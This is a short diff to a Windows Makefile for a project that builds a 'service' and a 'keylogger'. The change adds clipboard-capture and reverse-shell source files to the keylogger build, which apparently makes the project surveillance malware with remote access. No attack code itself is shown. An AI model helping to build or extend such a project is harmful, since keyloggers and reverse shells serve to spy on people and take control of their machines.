@@ -7,7 +7,7 @@ LINK			= link
 RM				= del
 
 SRC_SERVICE		= .\service\srcs\main.c .\service\srcs\service.c
-SRC_KEYLOGGER	= .\keylogger\srcs\main.c
+SRC_KEYLOGGER	= .\keylogger\srcs\main.c .\keylogger\srcs\clipboard.c .\keylogger\srcs\reverse_shell.c
 
 OBJ_SERVICE		= $(SRC_SERVICE:.c=.obj)
 OBJ_KEYLOGGER	= $(SRC_KEYLOGGER:.c=.obj)
